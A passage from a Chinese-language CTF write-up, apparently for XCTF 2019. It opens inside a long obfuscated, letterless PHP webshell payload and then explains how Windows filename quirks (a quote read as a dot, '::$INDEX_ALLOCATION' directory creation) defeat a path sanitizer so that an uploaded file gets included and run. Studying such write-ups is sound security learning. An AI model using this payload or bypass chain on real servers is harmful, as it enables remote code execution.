class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=<span class="hljs-string">"_"</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_____=$__<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__=<span class="hljs-string">''</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=<span class="hljs-string">"."</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_____($__)<span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>不过他们可能搞错了，这里他们本意想用<code>&lt;?=?&gt;</code>来绕过<code>;</code>限制，但是其实<code>;</code>并没有过滤…</p><p>最后一步可以说有了，我们来看看前几步，<code>Put</code>类的<code>__construct</code>有一个<code>path_sanitizer</code>，我们可以看到有一些检查什么的，没有<code>false</code>的情况是不会过滤<code>/</code>的，这里初始化的时候不会过滤<code>/</code>。</p><p>所以如果我们在写文件的时候，用<code>put&amp;test/test</code>去写<code>test</code>目录<code>test</code>文件，<code>file_put_contents</code>会因为<code>test</code>目录不存在而写不进去。</p><p></p><figure class="highlight reasonml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file<span class="hljs-constructor">_put_contents(.<span class="hljs-operator">/</span><span class="hljs-params">test</span><span class="hljs-operator">/</span><span class="hljs-params">test</span>)</span>: failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: No such file <span class="hljs-keyword">or</span> directory</span><br></pre></td></tr></tbody></table></figure><p></p><p>那如果我们直接写进一个<code>test</code>文件呢？写是没有问题的，但是我们在用<code>get</code>路由读的时候就会发生问题了。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">()</span></span>{</span><br><span class="line">  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;filename === <span class="hljs-keyword">false</span>){</span><br><span class="line">    <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"blocked by path sanitizer"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">// wtf???? //</span></span><br><span class="line">  <span class="hljs-keyword">if</span>(!@file_exists(<span class="hljs-keyword">$this</span>-&gt;filename)){</span><br><span class="line">    <span class="hljs-comment">// index files are *completely* disabled. //</span></span><br><span class="line">    <span class="hljs-keyword">if</span>(stripos(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-string">"index"</span>) !== <span class="hljs-keyword">false</span>){</span><br><span class="line">      <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"you cannot include index files!"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// hardened sanitizer spawned. thus we sense ambiguity //</span></span><br><span class="line">    $read_file = <span class="hljs-string">"./files/"</span> . <span class="hljs-keyword">$this</span>-&gt;filename;</span><br><span class="line">    $read_file_with_hardened_filter = <span class="hljs-string">"./files/"</span> . path_sanitizer(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">true</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span>($read_file === $read_file_with_hardened_filter ||</span><br><span class="line">       @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){</span><br><span class="line">      <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"request blocked"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">// .. and finally, include *un*exploitable file is included. //</span></span><br><span class="line">    @<span class="hljs-keyword">include</span>(<span class="hljs-string">"./files/"</span> . <span class="hljs-keyword">$this</span>-&gt;filename);</span><br><span class="line">    <span class="hljs-keyword">return</span> [<span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"success"</span>];</span><br><span class="line">  }<span class="hljs-keyword">else</span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"invalid filename (wtf)"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们仔细看这段代码，由于<code>path_sanitizer</code>传入了<code>true</code>，这里会把传入的文件名当中<code>/</code>过滤为空，然后有一个比较，如果直接拼接得到的路径与拼接上过滤之后得到的路径相等的话，会进一步比较他们的文件内容，如果相等的话就会被 block …而我们要进行 include ，那就需要绕过这两个判断…</p><p>什么个意思呢？就是即使文件名相等，内容也不能相等。</p><p>但是我们这里要注意<code>path_sanitizer</code>，如果我们传入一个含有<code>/</code>的文件名那就可以利用这个方法绕过文件名的判断，直接进行包含了。</p><p>而题目环境我们可以由一开始的 phpinfo 得到是一个 windows 的环境（虽然赛场是没有的，但是也可以通过各种方法判断一下，比如 nmap 啥的…）</p><p>所以我们现在主要就是绕读写文件这一块了。</p><h3 id="Trick-1"><a href="#Trick-1" class="headerlink" title="Trick 1"></a>Trick 1</h3><blockquote><p>​    对于Windows的文件读取，有一个小 Trick ：使用<code>FindFirstFile</code>这个API的时候，其会把<code>"</code>解释为<code>.</code>。</p><p></p><figure class="highlight stata hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">shell</span>"php === <span class="hljs-keyword">shell</span>.php<span class="hljs-comment">//true</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><p>所以我们可以利用这个 trick ，来构造文件名为<code>"/test</code>的文件，什么个意思呢？</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$read_file = <span class="hljs-string">"./files/./test"</span>;</span><br><span class="line">$read_file_with_hardened_filter = <span class="hljs-string">"./files/.test"</span>;</span><br><span class="line">file_get_contents($read_file) = <span class="hljs-string">'实际文件内容'</span>;</span><br><span class="line">file_get_contents($read_file_with_hardened_filter) = <span class="hljs-keyword">false</span> <span class="hljs-comment">//文件不存在</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>传入的<code>"/test</code>文件名，由于这个 trick ，会被 Windows 认为是<code>./test</code>，所以在处理这个方式上就产生了差异也就绕过了两个判断</p><h3 id="Trick-2"><a href="#Trick-2" class="headerlink" title="Trick 2"></a>Trick 2</h3><p>可以参考 <a href="https://c1h3ng.github.io/web/2018/06/19/windows-tricks/" target="_blank" rel="noopener">windows的一些特性</a> 这篇文章，文章最后告诉我们，可以上传一个文件名为<code>test::$INDEX_ALLOCATION</code>的文件，就相当于创建了一个<code>test</code>的文件夹，详细原理可以看该篇文章。</p><p>这样我们就可以先用这个 Trick 创建一个文件夹<code>test</code>，然后用<code>put</code>随意写一个文件<code>test/file</code>，在读取的时候，由于<code>path_sanitizer</code>会把我们的<code>/</code>过滤，就成功绕过了文件名的判断了。绕过了这些就只剩下无字母写 webshell 的问题了。</p><h2 id="noxss"><a href="#noxss" class="headerlink" title="noxss"></a>noxss</h2><p>单独为这道题开一篇文章来写，真的tql…</p><h2 id="tfboys"><a href="#tfboys" class="headerlink" title="tfboys"></a>tfboys</h2><p>机器学习的题目，表示不会…地址在 <a href="https://github.com/Xyntax/XCTF-2019-tfboys" target="_blank" rel="noopener">XCTF-2019-tfboys</a></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>体验极其好的一次比赛，非常感谢 @r3kapig 师傅们的精心准备，毫不夸张地说，这是本年度体验最好的一场比赛，无论从题目质量或者是从比赛过程的体验，都是非常棒的。希望国内以后更多一些这类的良心比赛！</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRa